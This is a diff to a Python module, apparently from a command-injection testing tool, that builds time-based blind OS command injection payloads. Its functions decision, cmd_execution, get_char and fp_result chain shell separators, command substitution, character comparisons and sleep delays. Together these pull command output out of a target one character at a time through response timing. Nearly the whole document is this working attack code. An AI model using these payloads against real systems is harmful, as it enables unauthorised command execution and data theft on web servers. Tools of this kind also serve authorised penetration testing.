@@ -79,12 +79,12 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
         ampersand = "&"
       payload = (ampersand + 
                  "sleep 0 " + separator + 
-                 "str=$(echo " + TAG + ") " + separator + 
+                 "str=$(echo " + TAG + ")" + separator + 
                  # Find the length of the output.
                  "str1=$(expr length \"$str\")" + separator +
                  #"str1=${#str}" + separator + 
-                 "[ " + str(output_length) + " -eq $str1 ] " + separator + 
-                 "sleep " + str(timesec) + " "
+                 "[ " + str(output_length) + " -eq $str1 ]" + separator + 
+                 "sleep " + str(timesec)
                  )
       if http_request_method == "POST":
         separator = urllib.unquote(separator)
@@ -92,8 +92,9 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                 "[ " + str(output_length) + " != $(echo " + TAG + " " + pipe + "tr -d '\\n' " + pipe + "wc -c) ] " + separator + 
-                 "sleep " + str(timesec) + " "
+                 "[ " + str(output_length) + " != $(echo " + TAG + " " + 
+                 pipe + "tr -d '\\n' " + pipe + "wc -c) ] " + separator + 
+                 "sleep " + str(timesec)
                  )  
     else:
       pass
@@ -242,13 +243,13 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
       else:
         ampersand = "&"
       payload = (ampersand + 
-                 "sleep 0 " + separator + 
-                 "str=\"$(echo $(" + cmd + "))\"" + separator +
+                 "sleep 0" + separator + 
+                 "str=$(echo $(" + cmd + "))" + separator +
                  # Find the length of the output.
-                 "str1=$(expr length \"$str\")" + separator +
+                 "str1=$(expr length $str)" + separator +
                  #"str1=${#str}  " + separator + 
-                 "[ " + str(output_length) + " -eq $str1 ] " + separator + 
-                 "sleep " + str(timesec) + " "
+                 "[ " + str(output_length) + " -eq $str1 ]" + separator + 
+                 "sleep " + str(timesec)
                  )
       if http_request_method == "POST":
         separator = urllib.unquote(separator)
@@ -256,8 +257,9 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                 "[ " +str(output_length)+ " != $(echo -n \"$(" + cmd + ")\" " + pipe + "tr -d '\\n'  " + pipe + "wc -c) ] " + separator +  
-                 "sleep " + str(timesec) + " "
+                 "[ " +str(output_length)+ " != $(echo -n \"$(" + cmd + ")\" " + 
+                 pipe + "tr -d '\\n'  " + pipe + "wc -c) ] " + separator +  
+                 "sleep " + str(timesec)
                  )
     else:
       pass
@@ -417,7 +419,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 "str=$(printf %d \"'$char'\")" + separator +
                 # Perform the time-based comparisons
                 "[ " + str(ascii_char) + " -eq ${str} ] " + separator + 
-                "sleep " + str(timesec) + " "
+                "sleep " + str(timesec)
                 )
       if http_request_method == "POST":
         separator = urllib.unquote(separator)
@@ -425,8 +427,10 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                "[ " + str(ascii_char) + " != $(" + cmd + pipe + "tr '\\n' ' '" + pipe + "cut -c " + str(num_of_chars) + pipe + "od -N 1 -i"+ pipe + "head -1"+ pipe + "tr -s ' '" + pipe + "cut -d ' ' -f 2) ] " + separator + 
-                "sleep " + str(timesec) + " "
+                "[ " + str(ascii_char) + " != $(" + cmd + pipe + "tr -d '\\n'" + 
+                pipe + "cut -c " + str(num_of_chars) + pipe + "od -N 1 -i" + 
+                pipe + "head -1" + pipe + "awk '{print$2}') ] " + separator + 
+                "sleep " + str(timesec)
                 )  
     else:
       pass
@@ -570,7 +574,7 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
                  "sleep 0 " + separator + 
                  "str=\"$(" + cmd + ")\" " + separator + 
                  "[ " + str(ascii_char) + " -eq ${str} ] " + separator + 
-                 "sleep " + str(timesec) + " "
+                 "sleep " + str(timesec)
                  )
       
       if http_request_method == "POST":
@@ -580,7 +584,7 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
       pipe = "|"
       payload = (pipe +
                  "[ " + str(ascii_char) + " != \"$(" + cmd + ")\" ] " + separator + 
-                 "sleep " + str(timesec) + " "
+                 "sleep " + str(timesec)
                  )  
     else:
       pass
